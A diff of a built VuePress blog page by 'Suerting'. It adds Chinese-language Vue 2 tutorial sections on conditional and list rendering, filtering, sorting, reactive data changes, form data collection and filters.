@@ -9,7 +9,7 @@
     <meta name="description" content="">
     <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
     
-    <link rel="preload" href="/assets/css/0.styles.eb5f38e4.css" as="style"><link rel="preload" href="/assets/js/app.43188468.js" as="script"><link rel="preload" href="/assets/js/3.9cc2d08d.js" as="script"><link rel="preload" href="/assets/js/1.fc1f1623.js" as="script"><link rel="preload" href="/assets/js/14.d9b13840.js" as="script"><link rel="prefetch" href="/assets/js/10.fe4168ac.js"><link rel="prefetch" href="/assets/js/11.2afa94d0.js"><link rel="prefetch" href="/assets/js/12.3391dcc7.js"><link rel="prefetch" href="/assets/js/13.ae3796de.js"><link rel="prefetch" href="/assets/js/15.129ecd7f.js"><link rel="prefetch" href="/assets/js/16.e0fd04d8.js"><link rel="prefetch" href="/assets/js/17.ec6ccf36.js"><link rel="prefetch" href="/assets/js/4.979f9922.js"><link rel="prefetch" href="/assets/js/5.dda74e2f.js"><link rel="prefetch" href="/assets/js/6.5eed2fc3.js"><link rel="prefetch" href="/assets/js/7.48f25f21.js"><link rel="prefetch" href="/assets/js/8.e3dca3e1.js"><link rel="prefetch" href="/assets/js/9.ed0584f8.js">
+    <link rel="preload" href="/assets/css/0.styles.eb5f38e4.css" as="style"><link rel="preload" href="/assets/js/app.44c03945.js" as="script"><link rel="preload" href="/assets/js/3.9cc2d08d.js" as="script"><link rel="preload" href="/assets/js/1.fc1f1623.js" as="script"><link rel="preload" href="/assets/js/14.c65e4df5.js" as="script"><link rel="prefetch" href="/assets/js/10.fe4168ac.js"><link rel="prefetch" href="/assets/js/11.2afa94d0.js"><link rel="prefetch" href="/assets/js/12.c27c1322.js"><link rel="prefetch" href="/assets/js/13.ae3796de.js"><link rel="prefetch" href="/assets/js/15.129ecd7f.js"><link rel="prefetch" href="/assets/js/16.40a23b68.js"><link rel="prefetch" href="/assets/js/17.bce76f10.js"><link rel="prefetch" href="/assets/js/4.979f9922.js"><link rel="prefetch" href="/assets/js/5.dda74e2f.js"><link rel="prefetch" href="/assets/js/6.5eed2fc3.js"><link rel="prefetch" href="/assets/js/7.48f25f21.js"><link rel="prefetch" href="/assets/js/8.e3dca3e1.js"><link rel="prefetch" href="/assets/js/9.ed0584f8.js">
     <link rel="stylesheet" href="/assets/css/0.styles.eb5f38e4.css">
   </head>
   <body>
@@ -31,7 +31,7 @@
   Tag
 </a></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-7dd95ae2></div> <aside class="sidebar" data-v-7dd95ae2><div class="personal-info-wrapper" data-v-1fad0c41 data-v-7dd95ae2><img src="/touxiang.jpg" alt="author-avatar" class="personal-img" data-v-1fad0c41> <h3 class="name" data-v-1fad0c41>
     Suerting
-  </h3> <div class="num" data-v-1fad0c41><div data-v-1fad0c41><h3 data-v-1fad0c41>6</h3> <h6 data-v-1fad0c41>Articles</h6></div> <div data-v-1fad0c41><h3 data-v-1fad0c41>4</h3> <h6 data-v-1fad0c41>Tags</h6></div></div> <ul class="social-links" data-v-1fad0c41><li class="social-item" data-v-1fad0c41><i class="iconfont reco-github" style="color:#3498db;" data-v-1fad0c41></i></li><li class="social-item" data-v-1fad0c41><i class="iconfont reco-npm" style="color:#f47e60;" data-v-1fad0c41></i></li></ul> <hr data-v-1fad0c41></div> <nav class="nav-links"><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  </h3> <div class="num" data-v-1fad0c41><div data-v-1fad0c41><h3 data-v-1fad0c41>6</h3> <h6 data-v-1fad0c41>Articles</h6></div> <div data-v-1fad0c41><h3 data-v-1fad0c41>4</h3> <h6 data-v-1fad0c41>Tags</h6></div></div> <ul class="social-links" data-v-1fad0c41><li class="social-item" data-v-1fad0c41><i class="iconfont reco-github" style="color:#3498db;" data-v-1fad0c41></i></li><li class="social-item" data-v-1fad0c41><i class="iconfont reco-npm" style="color:#fb9b5f;" data-v-1fad0c41></i></li></ul> <hr data-v-1fad0c41></div> <nav class="nav-links"><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
   TimeLine
 </a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
       Category
@@ -802,7 +802,277 @@ vm.$watch('weather',function(newValue,oldValue){
                 }
     })
 
+</code></pre></div><p><img src="https://raw.githubusercontent.com/Suerting/images/main/2023/20230319134932.png" alt=""></p> <h3 id="_15-条件渲染-v-show和v-if"><a href="#_15-条件渲染-v-show和v-if" class="header-anchor">#</a> 15，条件渲染：v-show和v-if</h3> <div class="language- extra-class"><pre class="language-text"><code>是否显示名字
+&lt;!-- 使用v-show做条件渲染 --&gt;
+&lt;h2 v-show=&quot;isshow&quot;&gt;名字：{{name1}}&lt;/h2&gt;
+&lt;button @click=&quot;isshowbutton&quot;&gt;v-show点击是否显示&lt;/button&gt;
+
+const vm=new Vue({
+   el:'#root',
+   data(){
+       return {
+           name1:'suerting',
+           isshow:true,
+       }
+   },
+   methods: {
+        isshowbutton(){
+            this.isshow=!this.isshow
+   },
+})
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>&lt;!-- 使用v-if做条件渲染 --&gt;
+&lt;h2 v-if=&quot;1===1&quot;&gt;直接写表达式的&lt;/h2&gt;
+&lt;h2 v-if=&quot;isif&quot;&gt;名字：{{name1}}&lt;/h2&gt;
+&lt;button @click=&quot;isifbutton&quot;&gt;v-if点击是否显示&lt;/button&gt;
+
+const vm=new Vue({
+   el:'#root',
+   data(){
+       return {
+           name1:'suerting',
+           isif:true
+       }
+   },
+   methods: {
+        isifbutton(){
+            this.isif=!this.isif
+        }
+   },
+})
+</code></pre></div><div class="custom-block warning"><p class="title"></p><p>v-if与template的配合使用，template不会破坏结构不会破坏结构</p> <p>v-if,v-else-if,v-else是一组判断，中间不允许被打断</p></div><div class="language- extra-class"><pre class="language-text"><code>例子
+&lt;h2&gt;当前n的值{{n}}&lt;/h2&gt;
+&lt;button @click=&quot;clicknvalue&quot;&gt;点击n增加&lt;/button&gt;
+&lt;div v-show=&quot;n===1&quot;&gt;v-show=&quot;n===1&quot;&lt;/div&gt;
+&lt;div v-show=&quot;n===2&quot;&gt;v-show=&quot;n===2&quot;&lt;/div&gt;
+&lt;div v-show=&quot;n===3&quot;&gt;v-show=&quot;n===3&quot;&lt;/div&gt;
+
+&lt;!-- 例子 --&gt;
+&lt;!-- 这是一组判断，中间不允许被打断--&gt;
+&lt;div v-if=&quot;n===1&quot;&gt;v-if=&quot;n===1&quot;&lt;/div&gt;
+&lt;div v-else-if=&quot;n===2&quot;&gt;v-else-if=&quot;n===2&quot;&lt;/div&gt;
+&lt;div v-else-if=&quot;n===3&quot;&gt;v-else-if=&quot;n===3&quot;&lt;/div&gt;
+&lt;div v-else&gt;v-else其他{{n}}&lt;/div&gt;
+
+const vm=new Vue({
+     el:'#root',
+     data(){
+        return {
+     		n:0
+        }
+      },
+     methods: {
+         clicknvalue(){
+            this.n++
+         }
+     },
+})
+</code></pre></div><h3 id="_16-列表渲染"><a href="#_16-列表渲染" class="header-anchor">#</a> 16，列表渲染</h3> <div class="custom-block tip"><p class="title"></p><p>语法：v-for=&quot;(item,index) in xxx&quot; :key=&quot;yyy&quot;</p></div><div class="language- extra-class"><pre class="language-text"><code>&lt;h3&gt;遍历数组&lt;/h3&gt;
+&lt;li v-for=&quot;i in person&quot; :key=&quot;i.id&quot;&gt;{{i.name}}-{{i.age}}
+&lt;li v-for=&quot;(i,index) of person&quot; :key=&quot;index&quot;&gt;{{i.name}}-{{i.age}}-{{index}}&lt;/li&gt;
+
+&lt;h3&gt;遍历对象&lt;/h3&gt;
+&lt;li v-for=&quot;(key,value,index) of car&quot; :key=&quot;index&quot;&gt;{{index}}-{{value}}-{{key}}&lt;/li&gt;
+car:{
+    name:'红旗',
+    price:'50万',
+    color:'磨砂黑'
+},
+
+&lt;h3&gt;遍历字符串&lt;/h3&gt;
+&lt;li v-for=&quot;(char,index) of str&quot; :key=&quot;index&quot;&gt;{{index}}-{{char}}&lt;/li&gt;
+
+&lt;h3&gt;遍历指定次数&lt;/h3&gt;
+&lt;li v-for=&quot;(number,index) of 5&quot; :key=&quot;index&quot;&gt;{{index}}-{{number}}&lt;/li&gt;
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>列表渲染数据后，添加一条新数据时，:key的值必须是id,具有唯一性
+将数据添加到最前面
+addperson(){
+    const p={id:'3',name:'suerting4',age:17}
+    this.person.unshift(p)
+}
+</code></pre></div><h3 id="_17-数据过滤"><a href="#_17-数据过滤" class="header-anchor">#</a> 17，数据过滤</h3> <div class="custom-block tip"><p class="title"></p><p>xxx.indexOf(str)返回指定字符串在xxx字符串第一次出现时的索引，没有则返回-1</p> <p>this.person.filter((i)=&gt;{</p> <p>​              return i.name.indexOf(newValue) !== -1</p> <p>})</p></div><div class="language- extra-class"><pre class="language-text"><code>监视属性实现
+&lt;input type=&quot;text&quot; placeholder=&quot;请输入关键字&quot; v-model=&quot;keyWord1&quot;&gt;
+&lt;ul&gt;
+	&lt;li v-for=&quot;(i,index) of filPerson&quot; :key=&quot;i.id&quot;&gt;{{i.name}}-{{i.age}}-{{i.sex}}&lt;/li&gt;
+&lt;/ul&gt;
+watch:{
+    keyWord1:{
+        immediate:true,
+        handler(newValue){
+            this.filPerson=this.person.filter((i)=&gt;{
+                return i.name.indexOf(newValue) !== -1
+            })
+        }
+    }
+},
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>计算属性实现
+&lt;input type=&quot;text&quot; placeholder=&quot;请输入关键字&quot; v-model=&quot;keyWord2&quot;&gt;
+&lt;ul&gt;
+&lt;li v-for=&quot;(j,index) of filcomper&quot; :key=&quot;j.id&quot;&gt;{{j.name}}-{{j.age}}-{{j.sex}}&lt;/li&gt;
+&lt;/ul&gt;
+computed:{
+    filcomper(){
+        return this.filPerson=this.person.filter((i)=&gt;{
+        	return i.name.indexOf(this.keyWord2) !== -1
+        })
+    }
+}
+</code></pre></div><h3 id="_18-排序"><a href="#_18-排序" class="header-anchor">#</a> 18，排序</h3> <div class="custom-block tip"><p class="title"></p><p>a-b是升序，b-a是降序</p> <p>arr.sort((a,b)=&gt;{
+return this.sorttype===1?a.age-b.age:b.age-a.age
+})</p></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>请输入关键字<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>keyWord<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sorttype=1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>年龄升序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sorttype=2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>年龄降序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sorttype=0<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>原顺序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>(j,index) of filPerson<span class="token punctuation">&quot;</span></span> <span class="token attr-name">:key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>index<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>{{j.name}}-{{j.age}}-{{j.sex}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
+return {
+    sorttype:0,//0原顺序，1升序，2降序
+    keyWord:''
+}
+computed:{
+    filPerson(){
+        const arr= this.person.filter((j)=&gt;{
+        	return j.name.indexOf(this.keyWord)!== -1
+        })
+        //判断是否排序
+        if(this.sorttype){
+            //a-b是升序，b-a是降序
+            arr.sort((a,b)=&gt;{
+            	return this.sorttype===1?a.age-b.age:b.age-a.age
+            })
+        }
+        return arr
+    }
+}
+</code></pre></div><h3 id="_19-数据改变"><a href="#_19-数据改变" class="header-anchor">#</a> 19，数据改变</h3> <div class="custom-block warning"><p class="title"></p><p>调用方法：this.$set( target, key, value )，target的值不能是vm,也不能是data的直接数据，只能给data中某一个对象追加属性，而不能给data追加属性</p></div><p>vue给对象添加属性和值</p> <div class="language- extra-class"><pre class="language-text"><code>this.$set(this.student,'sex','男')
+Vue.set(this.school,'master','SET')
+</code></pre></div><p>添加</p> <div class="language- extra-class"><pre class="language-text"><code>push() 方法可向数组的末尾添加一个或多个元素，并返回新的长度。
+this.student.hobby.push('xxx')//数组添加
+
+unshift() 方法可向数组的开头添加一个或更多元素，并返回新的长度。
+this.student.friends.unshift({name:'set0',sex:'nan'})//向数组对象添加一个对象
+
+arr.splice(1, 0, '1', '2') 从索引位置1添加，添加两个元素
+</code></pre></div><p>修改</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'开车'</span><span class="token punctuation">)</span><span class="token comment">//修改第一个，下标为0</span>
+Vue<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'走路'</span><span class="token punctuation">)</span>
+<span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'运动'</span><span class="token punctuation">)</span>
+<span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>friends<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'张三'</span>
+</code></pre></div><p>删除</p> <div class="language-js extra-class"><pre class="language-js"><code>arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法数组最后一位元素删除并返回数组的最后一个元素。
+
+arr<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 方法用于把数组的第一个元素从其中删除，并返回第一个元素的值
+
+使用过滤删除
+<span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>student<span class="token punctuation">.</span>hobby<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">h</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
+	<span class="token keyword">return</span> h<span class="token operator">!==</span><span class="token string">'学习'</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> 保留前两个元素之后的全部删除
+arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  从索引位置<span class="token number">2</span>删除，删除一个元素
+arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>从索引位置<span class="token number">1</span>删除，删除<span class="token number">2</span>个元素，并添加<span class="token number">2</span>个新元素来替代被删除的元素
+</code></pre></div><p>转换</p> <div class="language- extra-class"><pre class="language-text"><code>arr.reverse() 颠倒数组中元素的顺序。
+</code></pre></div><p>收集表单数据</p> <details class="custom-block details"><summary>See More</summary> <p>表单收集</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">@submit.prevent</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>dataShow<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token comment">&lt;!-- .trim去掉空格 --&gt;</span>
+    <span class="token comment">&lt;!-- .lazy失去焦点再传数据 --&gt;</span>
+    账号：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model.trim</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>account<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model.trim</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>password<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    年龄：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>number<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model.number</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>age<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    性别：
+    男：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>radio<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sex<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>男<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    女：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>radio<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sex<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>女<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    爱好：
+    <span class="token comment">&lt;!-- checkbox的v-model初始值是数组 --&gt;</span>
+    运动：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>checkbox<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hobby<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sport<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    听歌：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>checkbox<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hobby<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>sing<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+    走路：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>checkbox<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hobby<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>walking<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    所属校区：
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>address<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>请选择校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>A校区<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>A校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>B校区<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>B校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>C校区<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>C校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>D校区<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>D校区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    其他信息：
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">v-model.lazy</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>string<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>checkbox<span class="token punctuation">&quot;</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>agree<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>同意以上说明<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://www.baidu.com<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>同意协议<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
+</code></pre></div></details> <div class="language- extra-class"><pre class="language-text"><code>收集表单数据:
+若: &lt;input type=&quot;text&quot;/&gt;. 则v-mode1收集 的是value值，用户输入的就是value值。
+若: kinput type=&quot;radio&quot; /&gt;，则v-mode1收 集的是value值，且要给标签配置value值。
+若: &lt;input type=&quot; checkbox&quot;/&gt;
+1.没有配置input的value属性，那么收集的就是checked (勾选or未勾选，是布尔值)
+2.配置input的value属性:
+    (1)v- mode1的初始值是非数组，那么收集的就是checked (勾选or未勾选，是布尔值) 
+    (2)v-mode1的初始值是数组，那么收集的的就是value组成的数组
+        备注: v-mode1的 三个修饰符:
+        lazy:失去焦点再收集数据
+        number:输入字符串转为有效的数字
+        trim:输入首尾空格过滤
+
+</code></pre></div><div class="language- extra-class"><pre class="language-text"><code>methods: {
+    dataShow(){
+        alert(JSON.stringify(this._data))
+    }
+},
+</code></pre></div><h3 id="_20-过滤器"><a href="#_20-过滤器" class="header-anchor">#</a> 20,过滤器</h3> <div class="custom-block tip"><p class="title"></p><p>对要显示的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)</p></div><div class="language- extra-class"><pre class="language-text"><code>语法:
+1.注册过滤器:
+	全局过滤器Vue.filter(name, callback)   
+	局部过滤器new Vue{filters:{}}
